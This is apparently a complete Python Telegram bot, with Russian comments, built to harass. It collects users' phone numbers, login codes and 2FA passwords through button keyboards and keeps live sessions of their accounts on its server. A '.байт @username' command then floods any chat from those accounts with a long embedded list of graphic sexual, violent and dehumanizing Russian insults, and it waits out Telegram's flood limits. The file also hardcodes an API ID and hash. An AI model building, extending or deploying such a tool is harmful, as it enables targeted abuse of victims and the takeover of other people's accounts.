import asyncio
import os
from threading import Thread
from http.server import HTTPServer, BaseHTTPRequestHandler
from telethon import TelegramClient, events
from telethon.errors import FloodWaitError, SessionPasswordNeededError
from telethon.tl.custom import Button

# ========== КОНФИГ ==========
API_ID = 39163151
API_HASH = '3c0e92ad7b268eca1eb1a33a9baa7d1d'
BOT_TOKEN = os.environ.get('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')

SESSION_DIR = "sessions"
if not os.path.exists(SESSION_DIR):
    os.makedirs(SESSION_DIR)

# ========== ЗАГЛУШКА ДЛЯ RENDER ==========
class SimpleHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Bot is running!')
    def log_message(self, format, *args):
        pass

def run_webserver():
    port = int(os.environ.get('PORT', 10000))
    server = HTTPServer(('0.0.0.0', port), SimpleHandler)
    server.serve_forever()

Thread(target=run_webserver, daemon=True).start()

# ========== КЛИЕНТ БОТА ==========
bot_client = TelegramClient(
    os.path.join(SESSION_DIR, 'bot_session'),
    API_ID,
    API_HASH
).start(bot_token=BOT_TOKEN)

# ========== ХРАНИЛИЩА ==========
# Здесь хранятся авторизованные пользователи (их сессии)
user_clients = {}      # user_id -> TelegramClient (ЕГО аккаунт)
user_auth_data = {}    # user_id -> временные данные для авторизации
active_attacks = {}    # активные атаки

# ========== КЛАВИАТУРЫ ==========
def get_digit_keyboard():
    return [
        [Button.inline("1"), Button.inline("2"), Button.inline("3")],
        [Button.inline("4"), Button.inline("5"), Button.inline("6")],
        [Button.inline("7"), Button.inline("8"), Button.inline("9")],
        [Button.inline("0"), Button.inline("◀️"), Button.inline("✅")]
    ]

def get_clear_keyboard():
    return Button.clear()

# ========== ВСЕ СЛОВА ДЛЯ АТАКИ ==========
lines_list = [
"я твою мать ебал",
"я твою мать ебал в жопу",
"я твою мать ебал в рот",
"я твою мать ебал в глотку",
"я твою мать ебал в пизду",
"я твою мать ебал в анал",
"я твою мать ебал до крови",
"я твою мать ебал до гноя",
"я твою мать ебал до мяса",
"я твою мать ебал до костей",
"я твою мать ебал до кишок",
"я твою мать ебал до рвоты",
"я твою мать ебал до судорог",
"я твою мать ебал до агонии",
"я твою мать ебал до потери сознания",
"я твою мать ебал до клинической смерти",
"я твою мать ебал до остановки сердца",
"я твою мать ебал до паралича",
"я твою мать ебал до инвалидности",
"я твою мать ебал пока она не захлебнулась",
"я твою мать ебал пока она не кончила",
"я твою мать ебал пока она не вырубилась",
"я твою мать ебал пока у нее матка не выпала",
"я твою мать ебал пока кишки не повылазили",
"я твою мать ебал шлангом",
"я твою мать ебал ломом",
"я твою мать ебал арматурой",
"я твою мать ебал кувалдой",
"я твою мать ебал бутылкой",
"я твою мать ебал ручкой швабры",
"я твою мать ебал черенком лопаты",
"я твою мать ебал ножкой табурета",
"я твою мать ебал в подворотне",
"я твою мать ебал в сортире",
"я твою мать ебал у помойки",
"я твою мать ебал на свалке",
"я твою мать ебал в морге",
"я твою мать ебал в канализации",
"я твою мать ебал в выгребной яме",
"я твою мать ебал на вокзале",
"я твою мать ебал в ночлежке",
"я твою мать ебал за копейки",
"я твою мать ебал за дозу",
"я твою мать ебал за спайс",
"я твою мать ебал за фен",
"я твою мать ебал за опий",
"я твою мать ебал за глоток спермы",
"я твою мать ебал за удар членом по лицу",
"я твою мать драл",
"я твою мать топтал",
"я твою мать швырял",
"я твою мать ломил",
"я твою мать насиловал",
"я твою мать кромсал",
"я твою мать петушил",
"я твою мать уничтожал",
"я твою мать распластывал",
"я твою мать рвал",
"я твою мать жевал",
"я твою мать давил",
"я твою мать терзал",
"я твою мать калечил",
"я твою мать распинал",
"я твою мать четвертовал",
"я твою мать расчленял",
"я твою мать вешал",
"я твою мать травил кислотой",
"я твою мать сжигал заживо",
"я твою мать закапывал в землю",
"я твою мать сбрасывал с крыши",
"я твою мать переезжал машиной",
"я твою мать резал на куски",
"я твою мать в бетон заливал",
"твоя мать шалава",
"твоя мать блядина",
"твоя мать падаль",
"твоя мать мусорная яма",
"твоя мать гнойная рана",
"твоя мать сифилитичная дыра",
"твоя мать трипперная вонь",
"твоя мать гонорейная пустышка",
"твоя мать конченая скотина",
"твоя мать проститутка вокзальная",
"твоя мать наркоманка подзаборная",
"твоя мать бомжиха сортирная",
"твоя мать сосет у параши",
"твоя мать лижет у помойки",
"твоя мать глотает в подворотне",
"твоя мать обсасывает в сортире",
"твоя мать вылизывает в канализации",
"твоя мать заглатывает за спайс",
"твоя мать отсасывает за копейки",
"твоя мать дрочит на вокзале",
"твоя мать мастурбирует в ночлежке",
"твоя мать кончает под забором",
"ты гнойный мешок",
"ты недоносок",
"ты выкидыш",
"ты ссанье подзаборное",
"ты фекальная масса",
"ты мокрота из мамкиной матки",
"ты спермотоксикоз",
"ты отребье человеческое",
"ты гниющий труп",
"ты биомусор",
"ты ублюдок конченый",
"ты мразь ебанная",
"ты тварь дрожащая",
"ты гнида вшивая",
"ты пиздюк петушиный",
"ты ссыкло безъяйцевое",
"ты импотент хуев",
"ты даже стоять не можешь",
"ты даже на коленях говно",
"ты трясешься как заяц перед удавом",
"ты боишься собственной тени",
"ты хуже любой шалавы",
"ты хуже любой бляди",
"ты хуже помойной крысы",
"ты даже на органы не годен",
"твоя мать родила тебя в сортире и хотела смыть, но ты уцепился за унитаз",
"ты вырос мокротой на трубе",
"ты не человек а ошибка природы",
"ты не заслужил ни жизни ни смерти",
"тебя даже ад не примет",
"тебя даже черви жрут с брезгливостью",
"ты пустое место",
"ты ноль без палки",
"ты даже хуже нуля",
"я ломал твои ребра об асфальт",
"я выбивал твои зубы о бордюр",
"я проламывал твой череп о стену",
"я вырывал твой язык об унитаз",
"я отрубал твои пальцы о край мусорного бака",
"я раздроблял твои колени о канализационный люк",
"я выкалывал твои глаза ломом",
"я сломал твою челюсть кирпичом",
"я перебил тебе позвоночник трубой",
"я разорвал тебе сухожилия арматурой",
"я сжег твою морду кислотой",
"я отрезал тебе уши ножом",
"я расплющил твои ребра кувалдой",
"я вывернул тебе суставы",
"я забил твою глотку грязью",
"я засунул твою башку в унитаз и спустил воду",
"я твою рожу об асфальт тер",
"я твои кости собакам скормил",
"я твое тело в выгребную яму скинул",
"а ты даже не рыпнулся",
"а ты даже не пискнул",
"а ты даже мать не защитил",
"ты просто смотрел как ее трахают",
"ты лизал пол пока мать работала",
"ты стоял в углу и дрочил",
"ты кончал в штаны от страха",
"ты обоссался когда я на тебя посмотрел",
"ты обосрался когда я кашлянул",
"ты ссыкло конченое с детства",
"ты тряпка без воли",
"ты мешок без яиц",
"ты кусок дерьма в человеческой оболочке",
"ты даже ответить ничего не сможешь",
"ты проглотишь язык и будешь молчать",
"потому что ты никто",
"потому что ты ничто",
"потому что ты пустота",
"я твой бог",
"я твой господин",
"я твой повелитель",
"я твой палач",
"я твой судья",
"я твоя смерть",
"я тот кто пришел за тобой",
"я тот кто сломает тебя",
"я тот кто сотрет тебя в порошок",
"я тот кто выжжет тебя из памяти",
"я тот кто сделает так что никто не вспомнит твое имя",
"ты умрешь в грязи",
"ты сдохнешь под забором",
"ты захлебнешься собственной рвотой",
"ты подавишься собственным языком",
"ты изойдешь кровью из жопы",
"ты сгниешь заживо",
"тебя сожрут черви",
"тебя разложат бактерии",
"тебя размажут по асфальту",
"ты даже памяти о себе не оставишь",
"ты даже могилы не заслужишь",
"тебя похоронят в выгребной яме",
"тебя закопают на свалке",
"тебя скинут в канаву",
"ты будешь лежать гнить пока крысы не выедят тебе глаза",
"и никто не придет",
"никто не всплакнет",
"никто не вспомнит",
"потому что ты никто и звать тебя никак"
]

# ========== АТАКА ОТ ЛИЦА ПОЛЬЗОВАТЕЛЯ ==========
async def attack_loop(user_id, target, chat_id, stop_event):
    user_client = user_clients.get(user_id)
    if not user_client:
        return
    while not stop_event.is_set():
        for line in lines_list:
            if stop_event.is_set():
                break
            try:
                await user_client.send_message(chat_id, f'@{target} {line}')
                await asyncio.sleep(0.3)
            except FloodWaitError as e:
                await asyncio.sleep(e.seconds)
            except:
                pass
        await asyncio.sleep(0.3)

# ========== ОБРАБОТЧИК СООБЩЕНИЙ ==========
@bot_client.on(events.NewMessage)
async def handle(event):
    user_id = event.sender_id
    text = event.raw_text.strip()
    chat_id = event.chat_id

    # /start только в личке с ботом
    if text == '/start' and chat_id == user_id:
        if user_id in user_clients:
            await event.reply("✅ Твой аккаунт уже авторизован!\n\n.байт @username\n.байтстоп @username")
            return
        buttons = [[Button.request_phone("📱 Поделиться номером", resize=True)]]
        await event.reply("🔐 Нажми кнопку, чтобы авторизовать ТВОЙ аккаунт", buttons=buttons)
        return

    # Получение номера (только в личке с ботом)
    if event.contact and chat_id == user_id:
        phone = event.contact.phone_number
        if not phone:
            await event.reply("❌ Ошибка")
            return
        if user_id in user_auth_data:
            return
        
        session_path = os.path.join(SESSION_DIR, f'user_{user_id}')
        user_client = TelegramClient(session_path, API_ID, API_HASH)
        await user_client.connect()
        try:
            result = await user_client.send_code_request(phone)
            user_auth_data[user_id] = {
                'client': user_client,
                'phone': phone,
                'phone_code_hash': result.phone_code_hash,
                'state': 'code_waiting',
                'temp_input': ''
            }
            await event.reply(f"✅ Код отправлен на {phone[-4:]}\n\nВведи код кнопками:", buttons=get_digit_keyboard())
        except Exception as e:
            await event.reply(f"❌ {e}")
        return

    # Команды в ЛЮБОМ чате (если авторизован)
    if user_id in user_clients:
        if text.startswith('.байт '):
            parts = text.split()
            if len(parts) < 2:
                return
            target = parts[1].replace('@', '')
            key = f"{user_id}_{target}_{chat_id}"
            if key in active_attacks:
                return
            stop = asyncio.Event()
            task = asyncio.create_task(attack_loop(user_id, target, chat_id, stop))
            active_attacks[key] = {'task': task, 'stop': stop}
            return
        
        if text.startswith('.байтстоп '):
            parts = text.split()
            if len(parts) < 2:
                return
            target = parts[1].replace('@', '')
            key = f"{user_id}_{target}_{chat_id}"
            if key in active_attacks:
                active_attacks[key]['stop'].set()
                active_attacks[key]['task'].cancel()
                del active_attacks[key]
            return

# ========== INLINE КНОПКИ ДЛЯ КОДА ==========
@bot_client.on(events.CallbackQuery)
async def callback(event):
    user_id = event.sender_id
    data = event.data.decode('utf-8')
    
    if user_id not in user_auth_data:
        await event.answer("Нажми /start", alert=True)
        return
    
    auth = user_auth_data[user_id]
    
    if auth['state'] == 'code_waiting':
        if data == '✅':
            code = auth.get('temp_input', '')
            if len(code) < 3:
                await event.answer("Короткий код", alert=True)
                return
            try:
                await auth['client'].sign_in(
                    phone=auth['phone'],
                    code=code,
                    phone_code_hash=auth['phone_code_hash']
                )
                user_clients[user_id] = auth['client']
                del user_auth_data[user_id]
                await event.edit("✅ Твой аккаунт авторизован!\n\n.байт @username\n.байтстоп @username", buttons=get_clear_keyboard())
            except SessionPasswordNeededError:
                auth['state'] = 'password_waiting'
                auth['temp_input'] = ''
                await event.edit("🔐 Введи 2FA пароль:", buttons=get_digit_keyboard())
            except Exception as e:
                err = str(e).lower()
                if 'expired' in err:
                    await event.answer("Код устарел, новый отправлен", alert=True)
                    try:
                        new = await auth['client'].send_code_request(auth['phone'])
                        auth['phone_code_hash'] = new.phone_code_hash
                        auth['temp_input'] = ''
                        await event.edit("✅ Новый код отправлен. Введи:", buttons=get_digit_keyboard())
                    except:
                        await event.edit("❌ Ошибка, начни с /start", buttons=get_clear_keyboard())
                        del user_auth_data[user_id]
                else:
                    await event.edit(f"❌ {e}", buttons=get_clear_keyboard())
                    del user_auth_data[user_id]
        elif data == '◀️':
            auth['temp_input'] = auth.get('temp_input', '')[:-1]
            display = f"Код:\n`{auth['temp_input']}`" if auth['temp_input'] else "Введи код:"
            await event.edit(display, buttons=get_digit_keyboard())
        elif data.isdigit():
            auth['temp_input'] = auth.get('temp_input', '') + data
            display = f"Код:\n`{auth['temp_input']}`" if auth['temp_input'] else "Введи код:"
            await event.edit(display, buttons=get_digit_keyboard())
    
    elif auth['state'] == 'password_waiting':
        if data == '✅':
            pwd = auth.get('temp_input', '')
            if len(pwd) < 1:
                await event.answer("Введи пароль", alert=True)
                return
            try:
                await auth['client'].sign_in(password=pwd)
                user_clients[user_id] = auth['client']
                del user_auth_data[user_id]
                await event.edit("✅ Твой аккаунт авторизован!\n\n.байт @username\n.байтстоп @username", buttons=get_clear_keyboard())
            except Exception:
                await event.answer("Неверный пароль", alert=True)
                auth['temp_input'] = ''
                await event.edit("🔐 Неверный пароль, попробуй снова:", buttons=get_digit_keyboard())
        elif data == '◀️':
            auth['temp_input'] = auth.get('temp_input', '')[:-1]
            display = f"Пароль:\n`{auth['temp_input']}`" if auth['temp_input'] else "Введи 2FA пароль:"
            await event.edit(display, buttons=get_digit_keyboard())
        elif data.isdigit():
            auth['temp_input'] = auth.get('temp_input', '') + data
            display = f"Пароль:\n`{auth['temp_input']}`" if auth['temp_input'] else "Введи 2FA пароль:"
            await event.edit(display, buttons=get_digit_keyboard())

# ========== ЗАПУСК ==========
async def main():
    await bot_client.start()
    me = await bot_client.get_me()
    print(f'✅ Бот: @{me.username}')
    print('Пользователь авторизуется через /start')
    print('После авторизации .байт @username в ЛЮБОМ чате')
    await bot_client.run_until_disconnected()

with bot_client:
    bot_client.loop.run_until_complete(main())
